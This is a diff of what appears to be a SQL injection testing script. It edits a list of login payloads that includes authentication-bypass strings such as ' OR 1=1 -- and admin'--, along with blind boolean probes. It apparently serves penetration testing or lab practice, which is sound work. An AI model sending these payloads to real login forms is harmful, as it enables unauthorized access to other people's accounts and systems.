@@ -17,10 +17,10 @@ SECURE_URL  = f"{BASE_URL}/secure"
 # Each entry is: (payload string, description, technique category)
 
 LOGIN_PAYLOADS = [
+    ("admin'--",              "Admin shorthand bypass",        "Authentication Bypass"),
     ("' OR 1=1 --",           "Classic OR bypass",             "Authentication Bypass"),
-    ("' OR '1'='1' --",      "Quoted OR bypass",              "Authentication Bypass"),
-    ("' OR 'x'='x' --",      "String equality bypass",        "Authentication Bypass"),
-    ("admin' --",            "Admin comment injection",       "Authentication Bypass"),
+    ("' OR '1'='1' --",       "Quoted OR bypass",              "Authentication Bypass"),
+    ("' OR 'x'='x' --",       "String equality bypass",        "Authentication Bypass"),
     ("' OR 1=1#",            "Hash comment bypass",           "Authentication Bypass"),
     ("') OR ('1'='1",        "Parenthesis bypass",            "Authentication Bypass"),
     ("' AND 1=1 --",         "Blind Boolean TRUE",            "Blind Injection"),
